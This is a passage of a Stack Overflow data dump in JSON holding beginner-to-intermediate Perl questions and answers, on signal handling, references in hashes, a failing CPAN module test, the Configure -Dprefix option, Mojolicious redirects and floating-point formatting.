"https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574445021, "post_id": 58984231, "comment_id": 104249034, "body": "Can you check (for fact) what signal Ctrl-C sends on your system?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1574457538, "post_id": 58984231, "comment_id": 104254123, "body": "Does this run over a network of some sort -- can it be that Ctrl-C is killing some connection (thus the Broken pipe` you mention in another comment)? You have to give us more detail -- again, can you reduce that complex program to a few lines that still show the problem?"}, {"owner": {"reputation": 11918, "user_id": 12098405, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-C7IUyuZ5qqE/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rehqQyGdh463Xz2DY8S4TYPhnDvzA/photo.jpg?sz=128", "display_name": "dash-o", "link": "https://stackoverflow.com/users/12098405/dash-o"}, "edited": false, "score": 0, "creation_date": 1574624076, "post_id": 58984231, "comment_id": 104288558, "body": "Any reason not to call &#39;rotateLogs&#39; from the signal handling <code>catchSignal</code> ? Any problem with logRotation during normal exit ? Do you have to cover exit by &#39;die&#39;-ing ?"}], "owner": {"reputation": 216, "user_id": 10987492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92563934c53c8c39032655686d00da7d?s=128&d=identicon&r=PG&f=1", "display_name": "helloworld95", "link": "https://stackoverflow.com/users/10987492/helloworld95"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 84, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1574444107, "creation_date": 1574372652, "last_edit_date": 1574441061, "question_id": 58984231, "link": "https://stackoverflow.com/questions/58984231/perl-how-to-move-a-file-when-a-script-exits", "title": "Perl: How to move a file when a script exits", "body": "<p>I have a Perl script that's running. When it finished, a log file is moved from one directory to another. However, when the script is running and it is exited via <code>ctrl C</code>, the log is not moved. So, the next time the script finishes and the log will contain the info from the 1st unfinished run and the 2nd finished run. The pseudo code:</p>\n\n<pre><code>$SIG{INT} = \\&amp;catchSignal;\n$SIG{TERM} = \\&amp;catchSignal;\n\nsub catchSignal\n{\n    print \" We are exiting \\n\";\n    exit;\n}\n\n\nsub mainFuction()\n{\n    # Does a bunch of stuff\n    .\n    .\n    .\n    rotateLog()\n}\n\nsub rotateLog()\n{\n    # Moves the log from dir1 to dir2\n}\n</code></pre>\n\n<p>I'm wondering how to rotate that log (in Perl) when the script exits, whether from a <code>ctrl C</code> or the finishing of the script. </p>\n"}, {"tags": ["arrays", "perl", "hashtable"], "answers": [{"tags": [], "owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "is_accepted": false, "score": 2, "last_activity_date": 1574366275, "last_edit_date": 1574366275, "creation_date": 1574365898, "answer_id": 58982748, "question_id": 58982646, "link": "https://stackoverflow.com/questions/58982646/how-to-parse-an-array-to-a-hash-of-arrays/58982748#58982748", "title": "How to parse an array to a hash of arrays?", "body": "<p>If you are asking how to put an array as one value of a hash, you do this by taking a reference to the array, since references are scalars and the values of hashes must be scalars. This is done with the backslash operator.</p>\n\n<pre><code>$myhash{$key} = \\@mytable;\n</code></pre>\n\n<p>The for loop you describe creates such a reference through autovivification, as <code>$myhash{$key}[0]</code> creates an array reference at <code>$myhash{$key}</code> in order to assign to its index. Also note that the difference between taking a reference and copying each value is that in the former case, changes to the array after the fact will also affect the values referenced via the hash value, and vice versa.</p>\n\n<pre><code>$mytable[5] = 42; # $myhash{$key}[5] is also changed\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": true, "score": 0, "last_activity_date": 1574380272, "creation_date": 1574380272, "answer_id": 58985488, "question_id": 58982646, "link": "https://stackoverflow.com/questions/58982646/how-to-parse-an-array-to-a-hash-of-arrays/58985488#58985488", "title": "How to parse an array to a hash of arrays?", "body": "<p>As Grinnz mentioned you can save a reference to an array, but any change on the array latter will be reflected in hash (it is same data). </p>\n\n<p>For example if you reuse same array in the loop then data in hash will reflect last iteration of the loop.</p>\n\n<p>In such case you will want a copy of array stored in the hash.</p>\n\n<pre><code>@{$hash{$key}} = @array;\n</code></pre>\n\n<p><a href=\"https://docstore.mik.ua/orelly/perl4/prog/ch09_01.htm\" rel=\"nofollow noreferrer\">Programming Perl: Data strutures</a></p>\n"}], "owner": {"reputation": 3, "user_id": 12412546, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mC78nwbs9BQ80uAQ36leDTiVuK8tDNQEMHfMPq9qA=k-s128", "display_name": "Jerzy Witwinowski", "link": "https://stackoverflow.com/users/12412546/jerzy-witwinowski"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 62, "favorite_count": 0, "accepted_answer_id": 58985488, "answer_count": 2, "score": 0, "last_activity_date": 1574420748, "creation_date": 1574365472, "last_edit_date": 1574420748, "question_id": 58982646, "link": "https://stackoverflow.com/questions/58982646/how-to-parse-an-array-to-a-hash-of-arrays", "title": "How to parse an array to a hash of arrays?", "body": "<p>I'm a beginner (a wet lab biologist, who has to fiddle a bit with bioinformatics for the first time in my life) and today I've got stuck on one problem: how to parse an array to a hash of arrays in perl?</p>\n\n<p>This doesn't work:</p>\n\n<pre><code>@myhash{$key} = @mytable;\n</code></pre>\n\n<p>I've finally circumvented my problem with a for loop:</p>\n\n<pre><code>for(my $i=0;$i&lt;=$#mytable;$i++){$myhash{$key}[$i]=$mytable[$i]};\n</code></pre>\n\n<p>Of course it works and it does what I need to be done, but it seems to me not a solution to my problem, but just a way to circumvent it... When something doesn't work I like to understand why...</p>\n\n<p>Thank you very much for your advice!</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 609, "user_id": 11143545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/617c9145bb039f1defedce54b28e89b3?s=128&d=identicon&r=PG&f=1", "display_name": "Herdsman", "link": "https://stackoverflow.com/users/11143545/herdsman"}, "reply_to_user": {"reputation": 4644, "user_id": 1431720, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/f5a1388d4d3b2bf03b11bb5658c68c29?s=128&d=identicon&r=PG", "display_name": "Robert", "link": "https://stackoverflow.com/users/1431720/robert"}, "edited": false, "score": 0, "creation_date": 1574365704, "post_id": 58982166, "comment_id": 104217939, "body": "But why does a siimple installing failed then? I dont know why should any tests failed if the module is proper implemented (And I run the installation as sudo), so where could be the problem?"}], "answers": [{"comments": [{"owner": {"reputation": 609, "user_id": 11143545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/617c9145bb039f1defedce54b28e89b3?s=128&d=identicon&r=PG&f=1", "display_name": "Herdsman", "link": "https://stackoverflow.com/users/11143545/herdsman"}, "edited": false, "score": 0, "creation_date": 1574368876, "post_id": 58983290, "comment_id": 104219324, "body": "So you got the same error. That means the problem is not at my side. And by saying &quot;Bottom line&quot;, you are suggesting me to report the bug? Just asking, because that would confirm a problem at the server side."}, {"owner": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "edited": false, "score": 1, "creation_date": 1574369445, "post_id": 58983290, "comment_id": 104219574, "body": "It looks like the issue was reported 2 years ago: <a href=\"https://github.com/briandfoy/http-simplelinkchecker/issues\" rel=\"nofollow noreferrer\">github.com/briandfoy/http-simplelinkchecker/issues</a>"}, {"owner": {"reputation": 4644, "user_id": 1431720, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/f5a1388d4d3b2bf03b11bb5658c68c29?s=128&d=identicon&r=PG", "display_name": "Robert", "link": "https://stackoverflow.com/users/1431720/robert"}, "reply_to_user": {"reputation": 609, "user_id": 11143545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/617c9145bb039f1defedce54b28e89b3?s=128&d=identicon&r=PG&f=1", "display_name": "Herdsman", "link": "https://stackoverflow.com/users/11143545/herdsman"}, "edited": false, "score": 0, "creation_date": 1574372165, "post_id": 58983290, "comment_id": 104220780, "body": "@Herdsman I&#39;d bump the bug report @toolic has linked to. Maybe it gets fixed if enough people complain about it. In the mean time, I&#39;d either <code>--force</code> the install or look for another module that does the same thing, maybe <a href=\"https://metacpan.org/pod/checklink\" rel=\"nofollow noreferrer\">checklink</a> works for you."}], "tags": [], "owner": {"reputation": 4644, "user_id": 1431720, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/f5a1388d4d3b2bf03b11bb5658c68c29?s=128&d=identicon&r=PG", "display_name": "Robert", "link": "https://stackoverflow.com/users/1431720/robert"}, "is_accepted": true, "score": 3, "last_activity_date": 1574368375, "creation_date": 1574368375, "answer_id": 58983290, "question_id": 58982166, "link": "https://stackoverflow.com/questions/58982166/unable-to-install-module/58983290#58983290", "title": "Unable to install module", "body": "<p><code>*.t</code> are the actual test files that Perl runs, and names like Unauthorized code works are individual tests (methods). The output at the end (e.g., \"Link is...\") is just something the test printed to <code>stderr</code>.</p>\n\n<p>The source code for HTTP::SimpleLinkChecker is on <a href=\"https://github.com/briandfoy/http-simplelinkchecker/\" rel=\"nofollow noreferrer\">Github</a>, and looking at the tests, the <em>unit</em> tests actually try to connect to some server (oh my...). That server is <a href=\"http://www.pair.com/comdog/cgi-bin/403.cgi\" rel=\"nofollow noreferrer\">http://www.pair.com/comdog/cgi-bin/403.cgi</a>. When I <code>wget</code> that, I also get a 200 OK HTTP code, as your test does, but the test expected a 403, and hence it fails.</p>\n\n<p>Bottom line: report a bug with brian d foy, the maintainer of that Perl module (you can probably use the Github link above).</p>\n\n<p>It's up to you if you want to <code>--force</code> to install the module. Forcing means to ignore the failing tests and install anyway. This one is probably just a harmless unit test failure, but I'd be suspicious if other tests fail in different ways.</p>\n"}], "owner": {"reputation": 609, "user_id": 11143545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/617c9145bb039f1defedce54b28e89b3?s=128&d=identicon&r=PG&f=1", "display_name": "Herdsman", "link": "https://stackoverflow.com/users/11143545/herdsman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 45, "favorite_count": 0, "accepted_answer_id": 58983290, "answer_count": 1, "score": 0, "last_activity_date": 1574368375, "creation_date": 1574363583, "last_edit_date": 1574365199, "question_id": 58982166, "link": "https://stackoverflow.com/questions/58982166/unable-to-install-module", "title": "Unable to install module", "body": "<p>Just wanted to download one module:\n<code>sudo cpan HTTP::SimpleLinkChecker</code>\nbut while watching outputs, and error returned.</p>\n\n<pre><code>t/200.t ............ Link is http://blogs.perl.org/\nt/200.t ............ 1/? Link is https://www.perl.org/\nt/200.t ............ ok   \nt/403.t ............ Link is http://www.pair.com/comdog/cgi-bin/403.cgi\nt/403.t ............ 1/1 \n#   Failed test 'Unauthorized code works'\n#   at t/403.t line 9.\n#          got: '200'\n#     expected: '403'\n</code></pre>\n\n<p>But what does mean <code>Unauthorized code works</code>? Even if I made it with <code>sudo</code> privileges. </p>\n\n<p>And second question, what can tell me those pieces -> <code>t/200.t</code> or <code>t/200.t</code> in testing? At the end of the dots are some links, but how is it connected together?</p>\n\n<p>Moreover the <code>cpanm</code> is recommending me to install with <code>--force</code> option, which mean to neglect the tests, but if I do so, what would be the consequences? Would it mean the module is broken? So it can break my own script when using it?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 1, "creation_date": 1574361428, "post_id": 58981561, "comment_id": 104215968, "body": "You need to dereference the array reference: Try <code>foreach my $element (@{$my_session_data-&gt;{rows}{locations}}) { ... }</code>"}, {"owner": {"reputation": 181, "user_id": 11951910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c9e03113010e0ff5276db85314438f15?s=128&d=identicon&r=PG&f=1", "display_name": "newdeveloper", "link": "https://stackoverflow.com/users/11951910/newdeveloper"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1574361973, "post_id": 58981561, "comment_id": 104216224, "body": "Thanks.  I don&#39;t know if this is the correct way to go about it but I had to deference the <code>$element</code>.  <code>for my $item (@$element){..}</code>.  Why do I have to deference?"}, {"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 1, "creation_date": 1574362194, "post_id": 58981561, "comment_id": 104216325, "body": "The syntax of the <code>for</code> loop is described in <a href=\"https://perldoc.perl.org/perlsyn.html#For-Loops\" rel=\"nofollow noreferrer\">perlsyn</a> : <code>for VAR (LIST) BLOCK</code> so you need specify a list. A reference is interpreted as a list of a single element, namely the reference value itself. To iterate over the list of element in the array that the reference refers to, you need to dereference it"}], "answers": [{"tags": [], "owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "is_accepted": true, "score": 1, "last_activity_date": 1574362620, "creation_date": 1574362620, "answer_id": 58981925, "question_id": 58981561, "link": "https://stackoverflow.com/questions/58981561/looping-through-perl-array-prints-memory-address/58981925#58981925", "title": "Looping through perl array prints memory address", "body": "<blockquote>\n  <p>I am looping through a perl array but it is only printing the memory address.<br>\n  [...]<br>\n  <code>foreach my $element ($my_session_data-&gt;{rows}{locations}) {</code></p>\n</blockquote>\n\n<p>The syntax of the <code>for</code> loop is described in <a href=\"https://perldoc.perl.org/perlsyn.html#For-Loops\" rel=\"nofollow noreferrer\">perlsyn</a> : </p>\n\n<pre><code>LABEL for VAR (LIST) BLOCK\n</code></pre>\n\n<p>so you need to specify a <code>LIST</code> of items that you want to iterate over. A reference is interpreted as a \nlist of a single element, namely the reference value itself. To iterate over the list of element in the array that the reference refers to, you need to dereference it. Example:</p>\n\n<pre><code>$ perl -E '$ar = [1..3]; for my $item ($ar, $ar) { say $item }'\nARRAY(0x5596f7f2d780)\nARRAY(0x5596f7f2d780)\n$ perl -E '$ar = [1..3]; for my $item (@$ar) { say $item }'\n1\n2 \n3\n</code></pre>\n\n<p>So for your use case it would be:</p>\n\n<pre><code>foreach my $element (@{$my_session_data-&gt;{rows}{locations}}) { ... }\n</code></pre>\n"}], "owner": {"reputation": 181, "user_id": 11951910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c9e03113010e0ff5276db85314438f15?s=128&d=identicon&r=PG&f=1", "display_name": "newdeveloper", "link": "https://stackoverflow.com/users/11951910/newdeveloper"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "accepted_answer_id": 58981925, "answer_count": 1, "score": 0, "last_activity_date": 1574362620, "creation_date": 1574361101, "question_id": 58981561, "link": "https://stackoverflow.com/questions/58981561/looping-through-perl-array-prints-memory-address", "title": "Looping through perl array prints memory address", "body": "<p>I am looping through a perl array but it is only printing the memory address.</p>\n\n<pre><code>my $my_session_data = {\n rows =&gt; {\n    locations =&gt; [],\n  }\n};\n\nmy $data_row = [12, 55, '/home/pi/Desktop', undef];\npush(@{$my_session_data-&gt;{rows}{locations}}, $data_row);\n$data_row = [12, 36, '/home/pi/codes', undef];\npush(@{$my_session_data-&gt;{rows}{locations}}, $data_row);\n</code></pre>\n\n<p>my loop is:</p>\n\n<pre><code>foreach my $element ($my_session_data-&gt;{rows}{locations}) {\n    print $element;\n}\n</code></pre>\n\n<p>which prints out a memory address.</p>\n\n<p>When I do a dump of the data.</p>\n\n<pre><code>$VAR1 = [\n      [\n        12,\n        55,\n        '/home/pi/Desktop',\n        undef\n      ],\n      [\n        12,\n        55,\n        '/home/pi/code',\n        undef\n      ],\n      [\n        12,\n        55,\n        '/home/pi/state',\n        undef\n      ]\n    ];\n</code></pre>\n\n<p>I've also tried <code>foreach my $element ($my_session_data-&gt;{rows}-&gt;{locations})</code> and <code>foreach my $element ($my_session_data-&gt;{rows}-&gt;{locations}[0])</code> they all produce memory addresses.\nI think it should be the same as looping through an array however its only printing the memory address.  When I <code>ref $my_session_data-&gt;{rows}{locations}</code> prints array.  </p>\n"}, {"tags": ["linux", "perl", "configuration"], "answers": [{"tags": [], "owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "is_accepted": true, "score": 3, "last_activity_date": 1574363925, "last_edit_date": 1574363925, "creation_date": 1574358687, "answer_id": 58980940, "question_id": 58980815, "link": "https://stackoverflow.com/questions/58980815/what-does-dprefix-in-linux-do/58980940#58980940", "title": "What does &quot;-Dprefix&quot; in linux do?", "body": "<p>The <a href=\"https://github.com/Perl/perl5/blob/blead/INSTALL\" rel=\"nofollow noreferrer\">INSTALL</a> file in the source tree is a guide to the build process. -D is an option to the Configure script to define a symbol in the configuration of the Perl, as described in that script's <a href=\"https://github.com/Perl/perl5/blob/6bd6308fcea3541e505651bf8e8127a4a03d22cd/Configure#L1823\" rel=\"nofollow noreferrer\">usage text</a>.</p>\n\n<pre><code>  -D : define symbol to have some value:\n         -D symbol         symbol gets the value 'define'\n         -D symbol=value   symbol gets the value 'value'\n       common used examples (see INSTALL for more info):\n         -Duse64bitint            use 64bit integers\n         -Duse64bitall            use 64bit integers and pointers\n         -Dusethreads             use thread support\n         -Dinc_version_list=none  do not include older perl trees in @INC\n         -DEBUGGING=none          DEBUGGING options\n         -Dcc=gcc                 choose your compiler\n         -Dprefix=/opt/perl5      choose your destination\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 11342019, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qzzLu.png?s=128&g=1", "display_name": "Towermoni", "link": "https://stackoverflow.com/users/11342019/towermoni"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 126, "favorite_count": 0, "accepted_answer_id": 58980940, "answer_count": 1, "score": 0, "last_activity_date": 1574363925, "creation_date": 1574358189, "last_edit_date": 1574361657, "question_id": 58980815, "link": "https://stackoverflow.com/questions/58980815/what-does-dprefix-in-linux-do", "title": "What does &quot;-Dprefix&quot; in linux do?", "body": "<p>I recently installed Perl Version 5.30.0 onto my linux machine. I noticed in the install guide that when configuring Perl I had to use <code>-Dprefix</code> instead of <code>--prefix</code>. I was curious to what <code>-Dprefix</code> actually does but couldn't find any explanation online. Any information would be appreciated.</p>\n\n<p>Example of <code>-Dprefix</code>:</p>\n\n<pre><code>./configure -Dprefix=/some/directory/location\n</code></pre>\n\n<p>What I normally use to configure a software:</p>\n\n<pre><code>./configure --prefix=/some/directory/location \n</code></pre>\n\n<p>Perl install guide:\n<a href=\"https://www.cpan.org/src/\" rel=\"nofollow noreferrer\">https://www.cpan.org/src/</a> </p>\n"}, {"tags": ["perl", "mojolicious", "template-toolkit"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1574353068, "post_id": 58977162, "comment_id": 104211670, "body": "<code>www.redirecturl.com</code> is a valid URL, but it doesn&#39;t refer to another host. If you redirect to <code>www.redirecturl.com</code> from <code>http:&#47;&#47;x.y.com&#47;foo&#47;index.html</code>, then you are redirecting to <code>http:&#47;&#47;x.y.com&#47;foo&#47;www.redirecturl.com</code>. Provide the correct URL."}], "answers": [{"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 2, "last_activity_date": 1574346619, "creation_date": 1574346619, "answer_id": 58977295, "question_id": 58977162, "link": "https://stackoverflow.com/questions/58977162/redirect-to-a-different-domain-with-mojolicious/58977295#58977295", "title": "Redirect to a different domain with Mojolicious", "body": "<p>The <a href=\"https://metacpan.org/pod/Mojolicious::Plugin::DefaultHelpers#redirect_to\" rel=\"nofollow noreferrer\">documentation for <code>redirect_to()</code></a> gives the following examples:</p>\n\n<pre><code>$c = $c-&gt;redirect_to('named', foo =&gt; 'bar');\n$c = $c-&gt;redirect_to('named', {foo =&gt; 'bar'});\n$c = $c-&gt;redirect_to('/index.html');\n$c = $c-&gt;redirect_to('http://example.com/index.html');\n</code></pre>\n\n<p>From which, we can guess that if you want to redirect to a different domain, then you need to give it a complete URI - not just a domain name.</p>\n"}], "owner": {"reputation": 624, "user_id": 10023107, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/9GLme.jpg?s=128&g=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/10023107/chris"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "accepted_answer_id": 58977295, "answer_count": 1, "score": 0, "last_activity_date": 1574346619, "creation_date": 1574346213, "question_id": 58977162, "link": "https://stackoverflow.com/questions/58977162/redirect-to-a-different-domain-with-mojolicious", "title": "Redirect to a different domain with Mojolicious", "body": "<p>at Route / of my page, the user can see a button:</p>\n\n<pre><code>&lt;a href=\"[% h.url_for('post_route', param =&gt; someValue) %]\" target=\"_blank\"&gt;&lt;button&gt;click me&lt;/button&gt;&lt;/a&gt;\n</code></pre>\n\n<p>A click on this button will open a new tab and do a post to the \"post_route\".\nin the controller sub of the post_route, i want to check some things and then redirect the user to a different domain, let's just say for example to www.redirecturl.com.\nI also need to send payload to www.redirecturl.com (post request).\nthe domain www.redirecturl.com will then check the value i sent to it and render a specific page.</p>\n\n<p>Unfortunately it doesn't work as expected.\nIf i use i.e. <code>$self-&gt;redirect_to('www.redirecturl.com');</code>\ni get a \"redirect error\" in my browser with the information \"This problem can sometimes occur when cookies are disabled or denied.\".</p>\n\n<p>So... any idea how i can redirect with Mojolicious to a completely different domain and send some payload in the body?</p>\n\n<p>Thank you in advance</p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1574352137, "post_id": 58976839, "comment_id": 104211115, "body": "can&#39;t you just use <code>%.16g</code>?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1574352334, "post_id": 58976839, "comment_id": 104211235, "body": "@ysth, Maybe, but it sometimes returns &quot;e&quot; notation. I&#39;ll add to my answer."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 0, "last_activity_date": 1574352703, "last_edit_date": 1574352703, "creation_date": 1574345256, "answer_id": 58976839, "question_id": 58975555, "link": "https://stackoverflow.com/questions/58975555/perl-division-gives-different-result-to-javascript/58976839#58976839", "title": "Perl division gives different result to JavaScript", "body": "<p>It seems you want to round to 16 significant digits. You can use <code>%g</code> for that.</p>\n\n<pre><code>$ perl -le'printf \"%.16g\\n\", 838041641/908376077'\n0.9225712369789765\n\n$ perl -le'printf \"%.16g\\n\", 838041641/152508066'\n5.495064379086677\n</code></pre>\n\n<hr>\n\n<p>Do note that <code>%g</code> uses scientific notation for very large and very small numbers. If that's not acceptable, we could use <code>%e</code> to always get scientific notation, and use string manipulations to correct the format without introducing numerical errors.</p>\n\n<pre><code>sub round_to_16_sig_digits {\n   my ($n) = @_;\n   my $str = sprintf(\"%.15e\", $n);\n   $str =~ /^(-?)(\\d)\\.(\\d+)e(.*)/saa or die \"!!!\";\n   my $sign = $1;\n   $str = $2 . $3;\n   my $e = $4;\n   my $decimals = 15 - $e;\n   if ($decimals &gt; 0) {\n      $str = (\"0\" x ($decimals-15)) . $str if $decimals &gt; 15;\n      substr($str, -$decimals, 1, \".\");\n      $str =~ s/^0+\\./0./;\n      $str =~ s/\\.?0*\\z//;\n   } else {\n      $str .= \"0\" x (-$decimals);\n   }\n\n   return $sign . $str;\n}\n</code></pre>\n\n<p>For example,</p>\n\n<pre><code>say round_to_16_sig_digits($_)\n   for\n      838041641/908376077,\n      838041641/152508066;\n</code></pre>\n\n<p>outputs</p>\n\n<pre><code>0.9225712369789765\n5.495064379086677\n</code></pre>\n\n<hr>\n\n<p>Note that doubles (used by Perl and JavaScript) have a little less than 16 digits of precision (log<sub>10</sub>(2<sup>53</sup>)=15.95...), so JavaScript is inventing information that doesn't actually exist, which is why Perl rounds to 15 digits of precision.</p>\n"}], "owner": {"reputation": 11, "user_id": 9360550, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/49ebe185d2c4bdc467fb41aa3bca614e?s=128&d=identicon&r=PG&f=1", "display_name": "Willa", "link": "https://stackoverflow.com/users/9360550/willa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 65, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1574352703, "creation_date": 1574340790, "last_edit_date": 1574343377, "question_id": 58975555, "link": "https://stackoverflow.com/questions/58975555/perl-division-gives-different-result-to-javascript", "title": "Perl division gives different result to JavaScript", "body": "<p>In Perl I'm dividing two numbers, so:</p>\n\n<p><code>838041641/908376077</code></p>\n\n<p>This gives a Perl answer of:</p>\n\n<p><code>0.922571236978976</code></p>\n\n<p>But if you put it in a calculator (or use JavaScript) and the answer is:</p>\n\n<p><code>0.9225712369789765</code></p>\n\n<p>I need it to match the JavaScript answer. Is there any way to achieve this?</p>\n\n<p>Another example is:\n<code>838041641/152508066 = 5.49506437908668</code> (calculator = <code>5.495064379086677</code>)</p>\n"}, {"tags": ["arrays", "perl", "hash", "perl-module"], "comments": [{"owner": {"reputation": 4969, "user_id": 10971581, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XPQr1.png?s=128&g=1", "display_name": "jhnc", "link": "https://stackoverflow.com/users/10971581/jhnc"}, "edited": false, "score": 0, "creation_date": 1574341261, "post_id": 58975473, "comment_id": 104204251, "body": "<code>ref</code> told you that the variable is not a hash, it is a reference to a hash. use <code>keys %{ $Module... }</code>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574349431, "post_id": 58975473, "comment_id": 104209434, "body": "Hashes can only contains scalars. They can&#39;t contains hashes. When we say they contain hashes, they really contains references to hashes (references being scalars). <code>keys</code> requires a hash, so you need to dereference the reference."}, {"owner": {"reputation": 609, "user_id": 11143545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/617c9145bb039f1defedce54b28e89b3?s=128&d=identicon&r=PG&f=1", "display_name": "Herdsman", "link": "https://stackoverflow.com/users/11143545/herdsman"}, "edited": false, "score": 0, "creation_date": 1574362708, "post_id": 58975473, "comment_id": 104216544, "body": "<code>ref</code> told me litterally &#39;HASH&#39;, i dont know wheter uppercase means a reference or just hash as a type"}], "answers": [{"tags": [], "owner": {"reputation": 188041, "user_id": 10676716, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/arsQA.jpg?s=128&g=1", 